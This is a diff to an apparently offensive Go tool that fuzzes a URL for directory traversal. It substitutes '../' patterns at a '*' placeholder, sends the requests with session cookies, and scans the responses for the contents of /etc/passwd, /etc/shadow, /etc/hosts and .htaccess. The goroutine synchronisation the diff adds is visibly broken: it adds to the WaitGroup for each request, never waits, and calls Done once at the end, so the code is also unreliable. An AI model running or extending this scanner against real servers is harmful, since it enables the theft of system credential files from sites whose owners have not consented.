@@ -9,10 +9,13 @@ import (
 	"os"
 	"regexp"
 	"strings"
-	"time"
+	"sync"
 
 	"./utils"
 )
+
+// this variable is used to controll all goroutines
+var controllRoutines sync.WaitGroup
 
 var dotPatter = [...]string{"",
 	"/..",
@@ -146,6 +149,11 @@ func validateURL(url string) {
 
 }
 
+func findEndPointUser(URL string, pattern string) string {
+	st := strings.Replace(URL, "*", pattern, -1) // -1 all instances of * will be replace
+	return st
+}
+
 func findETCPasswd(response string, requestPattern string) {
 	etcPasswd := regexp.MustCompile(`root:(.*)\s\w(.*)`)
 	matchEtcPasswd := etcPasswd.FindStringSubmatch(response)
@@ -214,19 +222,21 @@ func main() {
 				for _, file := range filesPattern {
 					st := strings.Repeat(pattern, count)
 					fullPattern := inverted + st + file
-					requestPattern := *url + fullPattern
+					asteristicEndPoint := findEndPointUser(*url, fullPattern)
+					fmt.Println(asteristicEndPoint)
+					requestPattern := asteristicEndPoint
 					response := sendRequests(requestPattern, *cookies)
 
+					controllRoutines.Add(4)
 					go findETCPasswd(response, requestPattern)
 					go findETCHosts(response, requestPattern)
 					go findHtAcess(response, requestPattern)
 					go findetcShadow(response, requestPattern)
-					time.Sleep(3000 * time.Millisecond)
-
 				}
 			}
 		}
 		count++
 	}
 	fmt.Println(utils.SetColorYela("[+] All routines are finished !"))
+	controllRoutines.Done()
 }
